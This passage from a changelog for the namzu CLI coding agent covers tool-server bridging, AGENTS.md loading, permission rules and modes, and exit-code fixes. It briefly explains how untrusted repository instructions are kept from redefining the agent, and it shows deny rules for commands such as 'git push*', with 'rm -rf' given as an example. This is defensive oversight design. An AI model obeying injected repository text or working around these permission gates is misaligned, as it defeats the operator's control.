  asked" to "somebody decided", which is the part that was missing.

### Minor Changes

- e43bff6: namzu can connect to the tool servers you declare

  The kernel has spoken this protocol for a long time — `MCPClient`,
  `StdioTransport`, `StreamableHttpTransport` and the tool adapter are all
  exported from `@namzu/sdk`. `packages/cli` imported none of them. So the
  capability existed and was unreachable from the product: a namzu user could not
  connect an external tool server at all, whatever the kernel could do.

  Declare them under `mcpServers` in `namzu.config.json`:

  ```json
  {
    "mcpServers": {
      "tickets": { "command": "node", "args": ["./tools/tickets-server.js"] },
      "search": { "url": "https://tools.example.internal/mcp" }
    }
  }
  ```

  Their tools join the roster the agent works with, prefixed with the server's
  name — `mcp_tickets_create` — so two servers offering the same tool do not
  collide and the transcript says where a call went. A `[permissions]` rule can
  name a bridged tool like any other, and the server's own read-only and
  destructive hints are carried through to the gate.

  **A server that does not come up is named, with the reason.** That is the whole
  hazard this carries: an operator declares a server, watches the agent work
  without its tools, and concludes the model is bad at the task. An entry naming
  both a command and a url — or neither — is refused by name rather than guessed
  at. One server failing never takes the working ones with it.

  What happens next differs by who is watching, deliberately. The TUI prints the
  failure and carries on: you are there, you can read it and fix your config, and
  taking the session away would not help you do that. `namzu run` and
  `namzu run-stream` **refuse** — nobody is watching a headless run, and a script
  that quietly does half the job is worse than one that stops. `run` exits `1`;
  `run-stream` emits the reason as an `error` event.

  Each server gets ten seconds to start, hand shake and list its tools. A request
  timeout cannot cover a process that starts and never speaks, and without a
  bound one wedged server keeps namzu from starting at all — no error, no
  failure.

  A local server is a child process, and namzu now shuts its servers down when a
  session ends: when a one-shot finishes, and when switching providers in the TUI
  replaces one session with another. Nothing else in the CLI owned a child
  process, which is why a session had no shutdown path before this.

  Nothing to configure if you declare no servers; the roster is what it was.

### Patch Changes

- bc57137: A workspace its owner closed takes no new conversation from the CLI either

  The kernel gained a workspace-closed gate: an archived `Project` accepts no new
  session, enforced at the SDK's own ingress paths. The CLI's conversation store
  calls `createSession` on the store **directly**, and a store deliberately holds
  no view of workspace status — so the invariant did not reach here, and namzu
  kept attaching work to a workspace somebody had deliberately closed.

  Whether that was real turned on one question: does the CLI ever reach a project
  it did not just create? It does. `openSessions` reads the project id back out
  of `.namzu/cli.json` and creates a new project only when that pointer is
  missing or stale, so every run after the first attaches to a project that
  already existed. A freshly created project is always open, which is why the
  first run in a directory could never have shown this.

  `startConversation` now calls `requireOpenProject` before creating the session,
  and an archived workspace refuses by name.

  The sub-agent runtime calls `createSession` directly too and is deliberately
  **not** gated: its store is an in-memory one built four lines earlier, the
  project two lines earlier, and neither outlives the runtime — so the id can
  never be one an owner has closed. A check that cannot fail teaches the next
  reader only that the checks here are decoration, so that site carries a comment
  naming the condition that would make it real instead.

- Updated dependencies [b4a3fa7]
  - @namzu/sdk@14.0.4

## 0.8.0

### Minor Changes

- 6a38ecf: namzu reads the project's own `AGENTS.md` and follows it

  Until now every word namzu injected into its system prompt was about the user
  and global to the machine — its identity block, `~/.namzu/USER.md` and
  `~/.namzu/MEMORY.md`. Nothing about the repository it was standing in ever
  reached the model. A project that had written down how it wants code written
  got an agent that could not see it, and the only way to tell it was to paste
  the file by hand at the start of every session.

  The working directory's `AGENTS.md` is now loaded, along with the one in every
  directory up to the repository root — the first with a `.git`, which is a file
  in a worktree and a directory in a clone, and both count. They are ordered
  outermost first, so a package-level file has the last word over a
  repository-level one. Sub-agents get them too: a delegated task writes the same
  code in the same repository and is bound by the same rules.

  Nothing to configure and nothing to opt into. If your project has no
  `AGENTS.md`, the prompt is byte-for-byte what it was.

  What you will see change: namzu names the files it loaded — a line under the
  connect banner in the TUI, and the same line on stderr from `namzu run`,
  alongside the provider line. Nothing on stdout moves, so a script that pipes
  the answer is unaffected. `run-stream` loads the files identically but does not
  yet announce them on its event stream.

  A file is read up to 32,000 characters, and when one is cut the agent is told
  so in place, with the number of characters dropped. A truncated policy is never
  presented as a whole one.

  Read off the working directory means read off whatever directory you pointed
  at, including with `namzu run --cwd`. The text is injected after namzu's own
  identity and rules and is labelled as the project speaking, so a file cannot
  redefine the agent or talk it out of what it was told — but treat an
  `AGENTS.md` from a repository you do not trust the way you would treat its
  build script, which namzu will also run.

- 651e028: namzu is told what day it is and which branch it is on

  The kernel tells the model the working directory and the platform. It does not
  tell it the date, and it says nothing about the repository. Both are facts a
  coding agent needs constantly and cannot get right by guessing.

  A model with no clock answers from its training cut-off. It writes that date
  into a changelog entry, into a `last_updated` frontmatter field, into a
  copyright header, and reasons about "the current version" of a dependency from
  a year that has passed. Nothing about the output looks wrong — it is
  confidently, quietly stale. The branch matters for the same reason in a
  different direction: "commit this" means something else on a release branch
  than on a scratch one, and a detached HEAD means a commit goes nowhere
  reachable.

  So every turn now carries a short block: today's local calendar date, and
  whether the working directory is a repository, on which branch, or with a
  detached HEAD. Sub-agents get it too, resolved when the child is built rather
  than captured at startup, so a delegated task does not inherit a stale answer
  from a session that began yesterday.

  Local date, not UTC: your "today" is the one on your wall, and a machine behind
  UTC would otherwise be told it is tomorrow.

  Deliberately absent: anything about uncommitted changes. This block is the
  cached prefix of every request, and a dirty-file count changes whenever the
  agent saves a file — carrying it would re-key that cache on essentially every
  turn to say something `git status` answers on demand. Date and branch change
  rarely enough to be free.

  Nothing to configure. Two `git` calls per turn, each bounded at two seconds;
  a directory that is not a repository, a machine with no `git`, and a call that
  times out all resolve to the block simply not claiming the fact.

## 0.7.6

### Patch Changes

- Updated dependencies [f605059]
- Updated dependencies [589bcfc]
- Updated dependencies [af9c29d]
  - @namzu/sdk@14.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.7.5

### Patch Changes

- Updated dependencies [fbfb061]
- Updated dependencies [5aae875]
- Updated dependencies [9b01a9e]
  - @namzu/sdk@13.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.7.4

### Patch Changes

- Updated dependencies [d126799]
  - @namzu/sdk@12.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.7.3

### Patch Changes

- Updated dependencies [82267e1]
- Updated dependencies [368fa4b]
  - @namzu/sdk@11.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.7.2

### Patch Changes

- Updated dependencies [84660f7]
  - @namzu/sdk@10.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.7.1

### Patch Changes

- d088779: A delegated sub-agent joins its parent's trace, and shows the label it was made to write

  Two fixes to the `Agent` tool.

  **The child run started its own root trace.** `createTask` was called without
  `parentSpan`, so a sub-agent opened a disconnected root and the one structure a
  delegation trace exists to record — which turn dispatched which child — was the
  part that went missing. Anyone reading a trace saw N unrelated roots where there
  was one tree. The kernel already carries the span the whole way (executing
  tool → `createTask` → child run → child iterations); only the first hop was
  dropped. It now passes the executing tool's span, matching the SDK coordinator.

  If no span is in scope the key is omitted rather than sent as `undefined`: a
  top-level run with no parent is correct to start its own root, and inventing a
  parent would be a different wrong answer.

  **`description` was required and never read.** The schema forced the model to
  write a short label on every call, and the transcript then rendered a truncated
  `JSON.stringify` of the raw arguments instead — so a delegation appeared as
  `{"description":"Audit the auth flow","prompt":"Read every fi…` rather than
  `Agent(Audit the auth flow)`.

  We now **read it** rather than dropping the requirement. The model already
  writes a good label, the field costs nothing to keep, and removing it would
  leave delegations with no honest one-line summary at all — the fallback would
  still be the blob. `description` is consulted **last**, after `command`, `path`,
  `file_path`, `pattern` and `query`, so tools that already summarised correctly
  are unaffected; it only speaks for tools that were falling through to JSON. Two
  SDK coordinator tools whose `description` is likewise a user-facing label pick
  up the same improvement.

  Note for anyone verifying the trace fix in a terminal: the CLI registers no
  telemetry provider by default, so spans are no-ops until `@namzu/telemetry` is
  installed and a provider registered. The parenting is correct either way; it
  becomes visible when there is an exporter to see it.

- fff6a69: The context gauge in the status footer reports the context, not the bill

  The `ctx` bar divided **cumulative run spend** by a context window guessed from
  a substring of the model name. Neither term was the thing it claimed.

  Cumulative spend is monotone by design — it exists so a run can never
  under-report a bill — and it grows superlinearly in turn count, because every
  turn re-sends the whole history and counts those prompt tokens again. Ten turns
  over a 50k context accumulate roughly 500k. So the bar **saturated**: a long
  conversation read FULL while the real context might be a fifth of the window,
  and it was most wrong exactly where a user relies on it. People were compacting
  sessions that had room.

  It now reads the figures the kernel already measures and ships on
  `token_usage_updated`: `contextTokens` over `contextWindowTokens`. The
  model-name guess is deleted, so a window is whatever the run actually resolved
  rather than 200k-or-1M.

  Two things a reader of the bar should know:

  - **A `~` before the percentage means the ratio is inferred, not measured.** It
    appears when the kernel estimated the prompt size instead of the provider
    counting it, **and also when the window itself is the assumed default** — an
    exact count over an invented denominator is still a guess, and marking only
    the numerator would repeat the original error one level down.
  - **No bar at all when either term is missing.** Runs that resolve no window
    report no context figures, and a fraction that cannot be grounded is not an
    approximation of anything. The token and cost figures still show; only the
    proportion is withheld.

  Nothing to change on upgrade — no public export moved. The spend figure beside
  the bar is unchanged and still cumulative.

- Updated dependencies [16dc634]
- Updated dependencies [16dc634]
- Updated dependencies [a743c7e]
- Updated dependencies [529b343]
- Updated dependencies [e355049]
- Updated dependencies [16dc634]
  - @namzu/sdk@9.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.7.0

### Minor Changes

- 586bf3f: a compaction says so, instead of discarding context in silence

  Compaction deletes messages irrecoverably at 70% of the context window. The
  kernel measures the loss and puts both outcomes on the wire specifically so a
  host can show it; this one dropped them at `default: return null`, one function
  from the screen. So the first time anyone learned compaction existed was when
  the agent had forgotten something they were relying on — which reads as the
  model being stupid rather than the harness discarding context.

  Everything else fixed recently was _the run quietly not doing what the operator
  said_. This is the same class with the opposite sign: _the run quietly doing
  something they did not ask for_.

  A compaction now appears in the transcript, on stderr for `namzu run`, and as an
  NDJSON event for a host:

  ```
  ⌫ context compacted — 42 messages replaced by 9, ~120k → ~38k tokens
  ```

  **Only what is checkable.** Compaction summarises, so it cannot enumerate what
  was lost — the loss is fidelity, not a set of removable items, and "removed the
  file contents from turns 3-8" is a claim that cannot be substantiated and is
  worse than silence the first time it is subtly wrong. An estimated token count
  says it is estimated, because quoting an estimate as a measurement is that same
  lie in miniature.

  **A compaction that declines says which of three things happened**, because they
  want different responses and "compaction failed" would put the reader back where
  the silence did: a reducer that threw may work next pass and carries its own
  error; a reducer that shed nothing is reporting a fact, not an error, and will
  answer identically every time; a reducer that split a tool call from its result
  is a bug with no user action at all. Every case states that the history is
  unchanged, which the kernel guarantees by installing a reduction whole or not at
  all.

  The notice goes in the transcript rather than a status indicator, because an
  indicator is present while nothing is happening and gone afterwards — someone
  reading back could not tell whether the gap they were looking at was compacted.

- 60874b8: namzu has no daemon, and stops pretending otherwise

  The peer daemon namzu integrated with is deprecated and going away. Everything
  namzu built on top of it goes in this release. Four user-facing surfaces
  disappear, and one of them is not a command:

  - **`namzu tools`** — and its `ls`, `run <name>` and `sync-types` subcommands.
    It inspected and invoked that daemon's tool layer; with the daemon gone there
    is no layer to inspect.
  - **`/agents`** — listed the agent peers the daemon knew about, across your
    terminals and its LAN discovery.
  - **`/msg <peer> <text>`** — sent a message to another peer's inbox.
  - **The inbound channel.** This one had no command, which is exactly why it is
    easy to omit from a list of removals: another agent could put a message in
    namzu's inbox, and a running namzu would surface it, answer it while idle, and
    route the reply back to the sender. That loop is gone. Nothing can send a
    message to a running namzu any more, and a peer that does will get no answer
    rather than an error.

  **If your credential came from that daemon's secrets file, namzu will no longer
  find it.** It was the second source provider discovery scanned, so a key kept
  only there worked with no environment variable set — and the failure now is not
  an error message but an absence: the first-run picker opens as though you have
  no credential at all. Export it instead (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`,
  `OPENROUTER_API_KEY`, …) and namzu finds it again. The picker's empty state and
  `namzu doctor` both name the sources that are actually scanned now, so the
  answer is available from the command you would reach for when a key stops being
  found.

  **The agent loses that catalog's ~70 deferred tools** — web search, browser
  fetch, sandboxed execution and the rest. namzu runs on the SDK builtins plus its
  memory and task tools. The connect line drops its `(+N on demand)` suffix, which
  had been counting that catalog and nothing else.

  **`namzu serve` keeps its command and changes its answer.** It used to say
  coordination came from that daemon, so there was no separate namzu one — the
  second half of a sentence whose first half no longer exists. It now states the
  other claim outright: namzu has no daemon and no coordination surface, a run is
  an ordinary process, nothing needs to be running first. The command stays
  because someone typing it deserves an answer, and _unknown command_ is a worse
  one.

  **Config:** the `clawtool` section of `~/.namzu/cli.json` (`binary`, `endpoint`,
  `token`, `autoStart`) is gone from `NamzuCliConfig`. It was optional and
  zero-config, so a file that never set it is unaffected; a file that did will
  have the key ignored.

  **No deprecation window, deliberately.** The window exists so working code gets
  a release where it still runs and warns. The warning would have to say _migrate
  to X_, and there is no X — the thing being integrated with is itself deprecated.
  A warning advertising a migration path that does not exist is worse than the
  removal, and would need removing itself one release later.

  **`minor`, not `major`.** The package is pre-1.0 and promises no stability;
  `major` would move it to `1.0.0`, claiming the surface is settled in the same
  release that deletes three commands from it. That is the larger untruth.

- 3ba50ca: a permissions rule you wrote is the one that runs

  A `permissions` table in a config file did nothing. Not in `namzu run`, not in
  `run-stream`, not in the interactive TUI — nowhere, since the table was
  introduced. Three faults in series, each sufficient on its own:

  1. **The loader dropped it.** `sanitize()` copied exactly `format` and `quiet`
     off a parsed config file, so `permissions` never survived being read.
     `compilePermissions(ctx.config.permissions)` had always been compiling
     `undefined`.
  2. **The turn discarded it.** The top-level turn passed a module-level gate
     whose `rules` is a hardcoded empty array, so even a caller handing rules in
     explicitly had them dropped. The helper that folds them in was called on the
     sub-agent path only.
  3. **The TUI never asked for it.** Only `run` and `run-stream` compiled the
     table at all, so interactive sessions had no rules to drop in the first
     place.

  **Nothing looked broken, and that is the worst part.** The gate already falls
  back to asking, and `ask` compiles to no rule — so a discarded `deny` is
  indistinguishable from a config that was honoured. You are prompted, you
  approve, and you never learn your refusal was thrown away. A visible failure
  would have been found in a day.

  **What changes for you:** if you have a `permissions` table, it now applies. A
  `deny` refuses instead of prompting, and an `allow` stops asking. Check yours
  before upgrading — it has never actually run, so this is the first release in
  which it means anything. In an interactive session a `deny` is not even
  offered for approval, which is the point of writing one.

  Adding a field to the config type now fails to compile until the loader is
  taught to read it. The old code ended in `out as NamzuCliConfig`, and that cast
  is precisely what let `permissions` be declared, documented, type-checked and
  ignored; the loader's field list is now derived from the config type instead of
  restated beside it.

  Also documents where the config file lives and what it looks like, which was
  written down nowhere.

  `minor`, not `patch`: a table that was inert becomes active, so a `deny` you
  forgot you wrote can stop a command that used to run. Nothing about the API
  changed, but the behaviour a consumer sees does, and that is what the bump is a
  claim about.

### Patch Changes

- Updated dependencies [a39c2ed]
- Updated dependencies [f6e0594]
- Updated dependencies [9ac8dd4]
- Updated dependencies [3d4315e]
- Updated dependencies [a39c2ed]
- Updated dependencies [9ac8dd4]
- Updated dependencies [9ac8dd4]
- Updated dependencies [9ac8dd4]
- Updated dependencies [9ac8dd4]
- Updated dependencies [9ac8dd4]
- Updated dependencies [9ac8dd4]
- Updated dependencies [585a592]
  - @namzu/sdk@8.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.6.0

### Minor Changes

- 08b915f: `namzu run --continue` and `--resume <id>` reopen a previous conversation

  The store, the reader and the picker all existed — a conversation you could
  reopen inside the TUI with `/resume` could not be reopened from a script,
  because only the entry point was missing.

  `--continue` takes the most recent conversation in the working directory;
  `--resume <id>` takes the one you name.

  **Both refuse when the conversation cannot be reopened, and neither ever falls
  back to starting a new one.** Someone who types `--resume` is asking for _that_
  conversation; silently starting a fresh one hands back something
  indistinguishable from what they asked for, and they find out several turns
  later having already acted on it. Resuming with a partial transcript is worse
  still — a half-context is not a degraded context, it is a different context that
  lies about being complete.

  The refusal names the cause rather than the outcome, because the causes have
  different fixes: "no previous conversation in /path" points at `--cwd`, which is
  usually the real mistake, while an unknown id says how many others are there.

  There is deliberately no way to spell "resume if you can, otherwise start" — run
  with no flag for that.

- 724c8f6: `--permission-mode` decides what happens to the calls no rule covered

  The `[permissions]` table says what a tool may do. This says what happens to
  everything it did not cover: `prompt` asks, `auto` approves, `strict` refuses.

  `strict` is the one that did not exist. An unattended run could only be `auto`,
  so a CI job either trusted the agent with every tool it might reach for or could
  not use it. Under `strict` nothing runs unless a rule allowed it by name or
  pattern, and the refusal tells the model that asking again will not help — so it
  stops rather than rewording.

  `--yolo` and `--dangerously-skip-permissions` now mean `--permission-mode auto`.
  They were accepted and documented as doing nothing, which was true and
  unsatisfying.

  **Precedence, stated once:** a mode only governs calls no rule decided, so it can
  never reopen what a rule closed. `--permission-mode auto` cannot run something
  the config says `deny`, and neither can `--yolo`; the dangerous-pattern floor is
  above both. The config file is written once and reviewed; a flag is typed in a
  hurry. A prohibition a flag can lift is not a prohibition.

- b2d90ad: an operator can say which tools may run without asking

  The kernel has had a permission engine for as long as the gate has existed —
  `VerificationRule[]` with allow/deny/review, seven rule types, evaluated
  first-match-wins. The CLI passed `rules: []`. So the engine ran with nothing in
  it and every mutating call fell through to the same prompt, whether it was
  `git status` or `rm -rf`.

  A `[permissions]` table in the CLI config is now compiled into that array:

  ```toml
  [permissions]
  read = "allow"
  bash = { "git status*" = "allow", "git push*" = "deny", "*" = "ask" }
  ```

  **A tool nobody wrote a rule about is still asked about.** `ask` deliberately
  emits no rule, because the gate's fallback for an unmatched call is already
  `review` — if `ask` emitted something it would have to mean something different
  from silence, and it does not. There is no way to spell "allow by omission":
  widening the default has to be something an operator typed. A newly bridged
  tool that appears tomorrow prompts, exactly as it did before this existed.

  Patterns are ordered most-specific-first at compile time, because the kernel
  stops at the first match — `{ "*" = "ask", "git push*" = "deny" }` would
  otherwise read as a prohibition while being none. A trailing `" *"` also matches
  the bare command, so `git push *` catches `git push`.

  A line that cannot be read is reported and the rest still load. A permission
  someone wrote and which was silently dropped is the worst outcome available
  here: they believe a control is in force and it is not.

- 7c66bf2: `--instance` is removed, because it never did anything

  `run` and `run-stream` parsed `--instance <name>` into a field that nothing in
  the repository read. Its own comment said it chose "which namzu persona
  answers"; no persona selection exists. A host that passed it got the behaviour
  it asked for exactly never, and was told exactly nothing.

  That is worse than an absent flag. An absent flag reports itself the moment you
  use it. A flag that parses and is discarded reports nothing until someone
  notices the behaviour they asked for never happened — which for a persona
  selector could be a long time, or never.

  **What breaks:** `namzu run --instance x "…"` and `namzu run-stream --instance x
"…"` now fail with `unknown option(s): --instance` — exit 64 for `run`, an
  in-band error event for `run-stream`. Remove the flag from the invocation;
  nothing else changes, because nothing else ever depended on it.

  **Why no deprecation window.** SemVer's guidance is to precede a removal with a
  release that warns, so working code has a version where it still compiles. That
  exists to protect code that WORKS. There is no working code to protect here: the
  flag had no producer, no reader and no runtime effect, and the repository's
  release rule says such a declaration may be removed outright provided the
  changeset says so. This one says so.

  It was not wired instead, because wiring it would mean inventing persona
  selection to justify a flag that was already there — which is how dead
  configuration gets written rather than removed.

- 5391d93: `namzu run` takes the options `run-stream` takes, instead of reading them out to the model

  The two headless one-shots are the same command with different output — `run`
  prints the reply for a shell, `run-stream` emits one JSON event per line for a
  host UI — and they accepted different input. `run` parsed nothing at all and
  joined every argument into the prompt, so

  ```
  namzu run --cwd /projects/foo "fix the failing test"
  ```

  sent the model a prompt beginning `--cwd /projects/foo` and ran in this
  directory anyway. That is the defect fixed in `run-stream` one release ago,
  still live in its sibling.

  `run` now accepts `--cwd`, `--provider`, `--model`, `--skills` and `--`, parsed
  by the same function `run-stream` uses, so the two cannot drift again.

  **What breaks.** `run` refuses an option it does not recognise instead of
  treating it as prompt text:

  - `namzu run --temperature 0.5 "hello"` used to run, with `--temperature 0.5` as
    the first three words of the prompt, and exit 0. It now prints
    `unknown option(s): --temperature` and exits **64**.
  - A prompt that genuinely starts with a dash needs `--` in front of it:
    `namzu run -- --force means what?`. A single leading `-` was never an option
    and still is not.

  To keep the old behaviour for a prompt containing flag-shaped text, put `--`
  before it. There is no way to get back the old reading of an unrecognised
  `--flag` as prompt text, and that is the point of the change.

  Classified minor, not major: SemVer §4 puts 0.x outside the stable-API
  guarantee, and this matches how the same narrowing was classified for
  `run-stream`.

  `--yolo` / `--dangerously-skip-permissions` are accepted on both commands and do
  nothing there, which is now stated in `--help` rather than left to be inferred:
  a headless turn has nobody to ask for approval, so it never prompts, so there is
  no prompt to skip. The safety gate that refuses catastrophic shell commands is
  unaffected and cannot be bypassed by either flag.

### Patch Changes

- 5391d93: `namzu run` stops discarding piped input when a prompt is also given

  ```
  cat notes.txt | namzu run "summarise this"
  ```

  sent the model three words. The file was read by nothing: piped input was
  consulted only when there was no prompt argument at all. The run succeeded, exit
  0, and the answer was about nothing — a pipe and a question are the ordinary way
  to ask about a document, and taking only one of the two is the worst available
  reading of that command.

  Piped input is now used in both cases. With no prompt argument it IS the prompt,
  as before. Alongside one it is appended as the material the question is about,
  fenced so the model can tell the request from the content:

  ```
  summarise this

  <stdin>
  …the file…
  </stdin>
  ```

  `namzu run -` reads the prompt from stdin explicitly. Previously `-` was sent to
  the model as a one-character question.

  **On waiting.** Whether anything is being piped in cannot be answered without
  reading: a real pipe, an inherited-but-idle pipe and a test runner's stdin are
  indistinguishable to `fstat` on Windows — all three report neither FIFO nor
  file. So when the prompt came from an argument, the read waits up to 250ms for
  the first byte and then gives up; once a byte arrives it reads to end-of-input
  with no deadline, so a slow or large producer is never truncated. Without the
  bound, `namzu run "hello"` would hang forever in any context where stdin is open
  and silent, which is the ordinary state of a CI step. When there is no prompt
  argument the wait is unbounded, exactly as before — that path is a caller who
  has already said the prompt is coming.

- 663cde5: `run-stream` obeys the permission rules and mode it was given, instead of parsing them and running unrestricted

  `[permissions]` was compiled for `namzu run` and never for `namzu run-stream`, so
  a host UI ran with an empty rule list whatever the config said. `--permission-mode`
  had the same shape one level smaller: the shared parser accepted it, the command
  started, nothing failed, and the mode did nothing.

  Both are the defect the working-directory fix was about, in the change that was
  supposed to be about not making it again: **the run did not fail, it succeeded
  while quietly not doing what the operator said.** It is worse here, because the
  flag that silently does nothing is a SAFETY flag — someone reaches for `strict`
  precisely when they do not trust what the agent might do, and got an unrestricted
  run that looked like it had obeyed.

  `run-stream` now compiles the same table, resolves the same mode, and refuses a
  mode it does not recognise rather than proceeding. A rule that cannot be read is
  reported as an in-band error event, which is the only channel a host scanning
  stdout has.

- 5391d93: the agent works in the directory `--cwd` names, instead of searching this one and reporting nothing

  `--cwd` reached the session store and the skill search and stopped there. The
  run itself was started with the process's own directory, so:

  ```
  namzu run-stream --cwd /projects/foo "read notes.txt and edit it"
  ```

  made the model call `glob`, which answered

  ```
  No files found matching pattern "**/notes.txt" in /wherever/namzu/was/launched
  ```

  `notes.txt` exists. The agent looked somewhere else and reported the file
  missing, which is the worst available way to be wrong about a path — a user
  reads it as "that file is not there" rather than "I searched the wrong tree".
  Nothing was edited and the run still exited 0.

  The resolved directory is now what the whole session is built on: every
  filesystem tool, the sub-agent runtime, the task store and the memory store. It
  is threaded in as an argument (`createAgentSession(prefs, detected, { cwd })`)
  rather than read from `process.cwd()` at each of those four points, which is how
  the value went missing at exactly one of them.

  `--cwd` is also resolved to an absolute path and checked before the run starts.
  A path that is not there is refused instead of falling back to this directory —
  the silent fallback is what turned a typo into a run that searched somewhere
  else and found nothing.

  `namzu skills-json --cwd <path>` reads that directory's project skills too. It
  was the last command still ignoring the flag, so a host could be offered a skill
  for one checkout and then find that a turn in that same checkout could not load
  it.

  **Why no test caught it.** No test ran a file tool against a directory that was
  not the process's own, so the two were the same string in every assertion. The
  regression test executes the real `glob` builtin against a temporary directory
  and asserts it finds a file that exists nowhere else.

- Updated dependencies [062624c]
- Updated dependencies [bf0999d]
- Updated dependencies [bf0999d]
- Updated dependencies [cb772c7]
- Updated dependencies [062624c]
- Updated dependencies [bf0999d]
- Updated dependencies [69d609a]
  - @namzu/sdk@7.0.0
  - @namzu/anthropic@3.0.1
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.5.1

### Patch Changes

- Updated dependencies [f8355de]
- Updated dependencies [f8355de]
- Updated dependencies [f8355de]
  - @namzu/anthropic@3.0.0
  - @namzu/sdk@6.0.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.5.0

### Minor Changes

- 604a56a: completed is not succeeded — run_completed says why it stopped, and namzu run exits accordingly

  `run_failed` is emitted from exactly one place in the kernel: the throw path.
  Every other way a run can end badly arrives as `run_completed` — the token
  budget, the timeout, the iteration cap, a cancellation, a rejected plan, a
  refused structured output, and both guardrails.

  Measured: a `max_iterations` stop reports `status: 'completed'`, and the event
  carried nothing that distinguished it from an answered question.

  **SDK.** `run_completed` now carries `stopReason`. It is optional and additive,
  so nothing breaks; a consumer that wants to tell "answered" from "ran out of
  budget" no longer has to hold the `Run` alongside the event stream.

  **CLI — read this before upgrading if you script `namzu run`.** The command
  exited `0` for all of those. The sharp case is the output guardrail: an answer
  that was _refused_ exited `0` with empty text, so

  ```sh
  namzu run "write the release notes" > notes.md && publish notes.md
  ```

  published an empty file and reported success. `namzu run` now exits `1` when
  the run did not finish normally, and names the reason on stderr. The text still
  prints — partial output is real output, and a caller who piped it wants what
  there is — but `$?` can now say it is partial.

  If you have a script that depends on `namzu run` exiting 0 for a truncated run,
  it was depending on not being told. Check `$?` and read the stderr line.

  Also in the CLI, internally: the `done` agent event's `finishReason?: string`
  had no producer and no reader anywhere in the package, and the name belonged to
  a different concept — a "finish reason" here is `MessageStopReason`, reported
  per model message, not the run-level `StopReason` a caller asks about at the end
  of a turn. Replaced by `stopReason`. The type is not exported from the package
  entry, so this is internal.

- fdbbfb2: run-stream honours --cwd, and stops reading unknown flags aloud to the model

  `run-stream` and `history` both advertise `--cwd <path>` in their own help
  text. Neither ever parsed it. Worse than ignored: the parser folded every
  argument it did not recognise into `rest`, and `rest.join(' ')` is the
  **prompt** — so the invocation our help teaches,

  ```
  namzu run-stream --cwd /projects/foo "summarise this"
  ```

  sent the model a prompt reading `--cwd /projects/foo summarise this` while
  silently using the process's own directory. For `history` the same omission
  meant a host asking about a session in another checkout was told `[]`, which
  is indistinguishable from a session that exists and has no messages.

  `--cwd` is now parsed and actually used — it selects the `.namzu` store the
  session is read from and the directory skills are discovered in.

  **Behaviour change worth reading before you upgrade.** An unrecognised
  `--flag` is now refused with an error event instead of becoming prompt text.
  This is what makes a typo — `--modell gpt-4o` — a message rather than
  something the model is asked to interpret. If you deliberately send a prompt
  that begins with a dash, put `--` in front of it:

  ```
  namzu run-stream -- --force should be added to the docs
  ```

  Everything after `--` is prompt, verbatim. A single leading `-` was never
  treated as an option and still is not.

  Classified `minor` rather than `major` because this package is `0.x`, where
  [SemVer §4](https://semver.org/#spec-item-4) states the public API should not
  be considered stable and anything may change. On a `1.x` package the refusal
  would owe a major.

### Patch Changes

- Updated dependencies [604a56a]
- Updated dependencies [f25ebce]
- Updated dependencies [5496fb2]
- Updated dependencies [f25ebce]
- Updated dependencies [f25ebce]
- Updated dependencies [ca64062]
- Updated dependencies [61ca851]
- Updated dependencies [c8672ed]
- Updated dependencies [f25ebce]
- Updated dependencies [f25ebce]
- Updated dependencies [c6b8aa8]
  - @namzu/sdk@5.2.0
  - @namzu/anthropic@2.0.1

## 0.4.2

### Patch Changes

- a2cedfd: `namzu eval` now defaults `--dir` to `packages/evals`.

  The eval package moved there from the repository root. It is `@namzu/evals`, a
  private workspace member like every other package, and it was the only one
  living outside `packages/` — so `packages/*` in the workspace file now covers
  it and the explicit entry is gone.

  Pass `--dir` if your suites live elsewhere; the flag is unchanged.

- Updated dependencies [1cd1094]
- Updated dependencies [19d6a0f]
- Updated dependencies [1500973]
- Updated dependencies [a2cedfd]
  - @namzu/sdk@5.0.0
  - @namzu/anthropic@2.0.0
  - @namzu/openrouter@2.0.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0

## 0.4.1

### Patch Changes

- Updated dependencies [c3cb587]
- Updated dependencies [2b9d90e]
- Updated dependencies [4be54ca]
- Updated dependencies [a1f67f3]
- Updated dependencies [df07db8]
- Updated dependencies [19f390a]
  - @namzu/sdk@4.0.0
  - @namzu/anthropic@1.3.0
  - @namzu/ollama@1.2.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@1.1.0

## 0.4.0

### Minor Changes

- a1bf8ec: The behaviour gate can go red.

  Three things stood between `namzu eval` and being a gate, and each one made it report success.

  **It exited 0 when a suite never settled.** The promise stayed pending, node's event loop drained, `process.exit` was never reached, and the process ended on its default code. A gate that reports success by hanging is worse than no gate, because the green tick is what stops anyone from looking. Each suite now runs against a deadline (`--timeout-ms`, default five minutes) and a suite that overruns is **inconclusive** — exit 2 — with a message naming it. Inconclusive rather than failed, matching the rule the exit codes already state: nothing was judged, so there is no regression to chase, there is a harness to fix.

  **CI invoked the wrong file.** The step ran `packages/cli/dist/index.js`, which is the package barrel and not the CLI, so it executed nothing and passed on every push since it was added.

  **There were no suites.** `evals/` is now a private workspace member with a first suite, and `continue-on-error` is gone from the CI step — its own comment said to drop it the moment a suite existed, or the gate is decoration.

